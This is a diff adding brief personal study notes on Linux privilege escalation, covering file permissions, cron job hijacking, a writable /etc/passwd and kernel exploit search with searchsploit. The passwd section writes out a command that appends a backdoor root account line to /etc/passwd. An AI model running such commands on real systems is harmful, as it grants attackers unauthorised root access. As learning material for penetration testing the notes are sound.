@@ -1,0 +1,40 @@
+================
+linux privileges
+================
+access control
+	everything is file(file, directory, device, network communication)
+	there are 3 modes : Read Write eXecute
+
+=========================
+insecure file permissions
+=========================
+find suid bits
+examples
+	cron
+		grep "CRON" /var/log/cron.log
+		replace the job
+
+	passwd
+		is /etc/passwd writeable for all user ?
+			ls -l /etc/passwd
+		generate a hash
+			openssl passwd <password to change>
+			echo "root2:<created hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+======================
+kernel vulnerabilities
+======================
+step
+	1. check the system architecture
+		cat /etc/issue
+		cat /etc/*-release
+		uname -a
+		uname -r
+		arch
+	2. search the vulnerability
+		searchsploit
+
+=============
+compile C/C++
+=============
+use gcc
